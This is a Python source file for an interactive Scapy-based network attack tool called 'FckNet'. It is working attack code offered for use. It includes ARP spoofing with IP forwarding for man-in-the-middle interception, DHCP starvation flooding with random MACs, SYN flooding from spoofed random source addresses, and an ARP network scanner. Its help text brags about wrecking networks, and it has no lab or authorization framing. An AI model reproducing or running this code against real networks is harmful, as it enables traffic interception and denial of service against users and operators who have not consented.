#!/usr/bin/env python3

import os
import sys
import time
import logging
import socket
import warnings
import random
import threading
from scapy.all import Ether, ARP, IP, UDP, BOOTP, DHCP, srp, send, sendp, RandMAC, TCP
import scapy.all as scapy

# ASCII Banner for the tool
banner = """
   ___    _        __     _
  / __\__| | __ /\ \ \___| |_
 / _\/ __| |/ //  \/ / _ \ __|
/ / | (__|   </ /\  /  __/ |_
\/   \___|_|\_\_\ \/ \___|\__| ~ A1SBERG
"""

# Help banner to show applicable commands for FckNet
help_banner = """
Welcome to FckNet, where you can fck up networks according to your needs!!! 
Here's the list of commands for Fcknet:
- 'arp_spoof': Perform ARP Spoofing
- 'dhcp_starv': Perform DHCP Starvation
- 'net_scan': Perform Network Scanning
- 'syn_flood': Perform SYN Flooding
- 'help' or 'h': List all the applicable commands for FckNet
- 'exit' or 'quit': Terminate FckNet
"""

# Suppress Scapy warnings
warnings.filterwarnings("ignore", category=UserWarning)
scapy_logger = logging.getLogger("scapy.runtime")
scapy_logger.setLevel(logging.ERROR)


def setup_logging():
    """
    Set up logging with DEBUG level and a specific log format.
    """
    logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

def check_if_root():
    """
    Check if the script is run as root.
    If not, print a message and exit.
    """
    if os.geteuid() != 0:
        print("Run as root, Idiot.")
        exit()

def validate_ip(ip):
    """
    Validate the format of the provided IP address.
    :param ip: IP address string
    :return: True if valid, False if invalid
    """
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False


def get_local_ip():
    """
    Retrieve the local IP address of the machine.
    :return: IP address as a string
    """
    try:
        return scapy.get_if_addr()
    except OSError:
        logging.error("Failed to snatch the local IP Address")
        sys.exit(1)


### ARP SPOOFER ###
def get_active_hosts(interface):
    """
    Scan the network for active hosts using ARP requests.
    :param interface: Network interface to use
    :return: List of active host IPs
    """
    logging.info("Scanning the network for active targets...")
    try:
        ans, _ = scapy.arping(interface, timeout=1, verbose=False)
        active_hosts = [response[1].psrc for response in ans]
        logging.info("Snatched some active targets: %s", active_hosts)
        return active_hosts
    except Exception as e:
        logging.error("Failed to locate active targets: %s", e)
        return []


def get_mac(ip):
    """
    Fetch the MAC address of a device using its IP address.
    :param ip: Target IP address
    :return: MAC address if found, otherwise None
    """
    try:
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = srp(arp_request_broadcast, timeout=1, verbose=False, retry=3)[0]
        if answered_list:
            return answered_list[0][1].hwsrc
    except IndexError:
        pass


def arp_spoof(target_ip, spoof_ip):
    """
    Perform ARP spoofing by sending fake ARP packets.
    :param target_ip: Victim IP address
    :param spoof_ip: IP address to impersonate (usually the router)
    """
    target_mac = get_mac(target_ip)
    if target_mac:
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(packet, verbose=False)
        logging.info("Sent a devious ARP packet to %s", target_ip)
    else:
        logging.error("Failed to get the MAC address of the target %s", target_ip)


def restore_arp_tables(destination_ip, source_ip):
    """
    Restore the original ARP tables by sending correct ARP responses.
    :param destination_ip: Destination IP address
    :param source_ip: Source IP address
    """
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if destination_mac and source_mac:
        packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        send(packet, count=4, verbose=False)
        logging.info("ARP tables reset for %s", destination_ip)
    else:
        logging.error("Failed to reset ARP tables for %s", destination_ip)


def enable_ip_forwarding():
    """
    Enable IP forwarding in the system to allow packet forwarding between networks.
    """
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "r") as file:
            if file.read() == "0\n":
                with open("/proc/sys/net/ipv4/ip_forward", "w") as file:
                    file.write("1\n")
                    logging.info("IP forwarding is now on")
    except IOError:
        logging.exception("Failed to flick the IP forwarding switch")


def disable_ip_forwarding():
    """
    Disable IP forwarding in the system.
    """
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "r") as file:
            if file.read() == "1\n":
                with open("/proc/sys/net/ipv4/ip_forward", "w") as file:
                    file.write("0\n")
                    logging.info("IP forwarding is now off")
    except IOError:
        logging.exception("Failed to turn off IP forwarding")


### DHCP Starvation ###
def create_dhcp_discover():
    """
    Create a DHCP Discover packet for DHCP Starvation attack.
    :return: DHCP Discover packet
    """
    return Ether(dst='ff:ff:ff:ff:ff:ff', src=RandMAC()) \
           / IP(src='0.0.0.0', dst='255.255.255.255') \
           / UDP(sport=68, dport=67) \
           / BOOTP(op=1, chaddr=RandMAC()) \
           / DHCP(options=[('message-type', 'discover'), ('end')])


def send_dhcp_discover(interface):
    """
    Send DHCP Discover packets to flood the DHCP server.
    :param interface: Network interface to send packets on
    """
    dhcp_discover = create_dhcp_discover()
    logging.info("Created DHCP discover packet: %s", dhcp_discover.summary())
    try:
        logging.info('Sending a DHCP discover packet on interface: %s', interface)
        sendp(dhcp_discover, iface=interface, loop=0.01, verbose=True)
    except Exception as e:
        logging.exception('Failed to send packets: %s', e)


### Network Scanner ###
def get_mac_and_name(ip):
    """
    Get the hostname and MAC Address of a device using its IP.
    :param ip: Target IP Address
    :return: Hostname if available, otherwise 'Unknown'
    """
    try:
        hostname = socket.gethostbyaddr(ip)[0]
    except socket.herror:
        hostname = "Unknown"
    return hostname


def scan_network(ip_range):
    """
    Perform a network scan to discover active devices within an IP range.
    :param ip_range: IP range to scan
    :return: List of devices with their IP, MAC, and hostname
    """
    arp = ARP(pdst=ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp
    result = srp(packet, timeout=3, verbose=0)[0]
    devices = []
    for sent, received in result:
        hostname = get_mac_and_name(received.psrc)
        devices.append({'ip': received.psrc, 'mac': received.hwsrc, 'name': hostname})
    return devices


def display_results(devices):
    """
    Display the results of a network scan in a formatted manner.
    :param devices: List of scanned devices
    """
    print("IP Address\t\tMAC Address\t\t\tDevice Name")
    print("-" * 67)
    for device in devices:
        print(f"{device['ip']}\t\t{device['mac']}\t\t{device['name']}")


### SYN Flooding ###
def generate_random_ip():
    """
    Generate a random IPv4 address.
    Returns:
        str: A randomly generated IPv4 address in the form 'X.X.X.X'
        where each X is a number between 0 and 255
    """
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))


def generate_random_port():
    """
    Generate a random TCP/UDP port number.
    Port numbers are chosen from the range of 1024 to 65535, which are
    considered user-defined ports (also known as dynamic or private ports)
    Returns:
        int: A randomly generated port number between 1024 and 65535
    """
    return random.randint(1024, 65535)


def send_syn_packets(target_ip, target_port, packet_rate, duration, stats):
    """
    Send SYN packets to a target IP and port to simulate a SYN flooding attack.
    :param target_ip (str): The target IP address to send the SYN packets to
    :param target_port (int): The target port number to which the SYN packets are sent
    :param packet_rate (int): The rate (in packets per second) at which to send packets
    :param duration (int): The total duration (in seconds) to continue sending packets
    :param stats (dict): A dictionary to keep track of the number of packets sent
                      It should contain a key 'sent_packets' to store the counts
    Raises:
        Exception: Logs an error if any exception occurs while sending packets
    """
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            src_ip = generate_random_ip()
            src_port = generate_random_port()
            ip_packet = IP(src=src_ip, dst=target_ip)
            syn_packet = TCP(sport=src_port, dport=target_port, flags="S")
            send(ip_packet / syn_packet, verbose=False)
            stats['sent_packets'] += 1
            if stats['sent_packets'] % packet_rate == 0:
                logging.info("Sent %d packets to %s:%d", stats['sent_packets'], target_ip, target_port)
        except Exception as e:
            logging.error("Error sending packets: %s", e)


def start_syn_flood(target_ip, target_port, packet_rate, duration):
    """
    Start SYN flooding the target IP with TCP SYN packets.
    :param target_ip: Target IP address to flood
    :param target_port: Target port to flood
    :param packet_rate: Number of packets to send per second
    :param duration: Duration for the flooding in seconds
    """
    stats = {'sent_packets': 0}
    flood_thread = threading.Thread(target=send_syn_packets, args=(target_ip, target_port, packet_rate, duration, stats))
    flood_thread.start()
    flood_thread.join()
    logging.info("Flooding complete: Sent %d packets to %s:%d", stats['sent_packets'], target_ip, target_port)


def main():
    """
    Main function to handle user inputs and execute the corresponding network attack.
    """
    setup_logging()
    check_if_root()
    print(banner)
    while True:
        command = input("Fcknet> ").strip().lower()
        if command == 'exit' or command == 'quit':
            logging.info("Terminating FckNet...")
            break
        elif command == 'help' or command == 'h':
            print(help_banner)
        elif command == 'arp_spoof':
            target_ip = input("Enter target IP for ARP Spoofing: ").strip()
            spoof_ip = input("Enter spoof IP (usually router's IP): ").strip()
            if validate_ip(target_ip) and validate_ip(spoof_ip):
                enable_ip_forwarding()
                while True:
                    arp_spoof(target_ip, spoof_ip)
                    time.sleep(1)
            else:
                logging.error("Invalid IP addresses.")
        elif command == 'dhcp_starv':
            interface = input("Enter network interface (e.g., eth0, wlan0): ").strip()
            send_dhcp_discover(interface)
        elif command == 'net_scan':
            ip_range = input("Enter IP range to scan (e.g., 192.168.1.1/24): ").strip()
            devices = scan_network(ip_range)
            display_results(devices)
        elif command == 'syn_flood':
            target_ip = input("Enter target IP for SYN Flood: ").strip()
            target_port = int(input("Enter target port for SYN Flood: ").strip())
            packet_rate = int(input("Enter packets per second: ").strip())
            duration = int(input("Enter duration in seconds: ").strip())
            start_syn_flood(target_ip, target_port, packet_rate, duration)
        else:
            logging.warning("Invalid command, type 'help' for options.")


if __name__ == "__main__":
    main()
